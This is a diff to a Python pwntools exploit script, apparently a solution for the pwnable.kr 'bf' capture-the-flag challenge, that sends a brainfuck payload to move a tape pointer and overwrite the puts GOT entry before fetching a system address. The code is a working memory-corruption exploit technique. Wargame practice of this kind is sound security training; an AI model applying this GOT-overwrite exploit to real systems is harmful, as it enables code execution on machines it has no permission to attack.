@@ -12,14 +12,17 @@ from pwn import *
 remoto = False
 remoto = True
 if remoto:
-	host = '0'
 	host = 'pwnable.kr'
+	host = '0'
 	conn = connect(host, 9001)
 else:
 	conn = process('./bf')
 
 p = 0x0804a0a0
 fgets_got = 0x804a010
+puts_got = 0x804a018
+strlen_got = 0x804a020
+
 """
 +: suma 1(byte) a donde apunta p
 -: resta 1(byte) a donde apunta p
@@ -71,7 +74,8 @@ def get_got():
 
 def overwrite_puts():
 	new_puts = 0x08048700
-	payload  = '<' * (136-3)
+	bytes_dif = p - puts_got
+	payload  = '<' * (bytes_dif - 3)
 	payload += ',<' * 4
 	payload += '['
 	sendPayload(payload)
@@ -86,7 +90,9 @@ def main():
 	conn.recvuntil('[ ]\n')
 
 	overwrite_puts()
-	get_system_addr()
+	system = get_system_addr()
+
+	#conn.interactive()
 
 	conn.close()
 
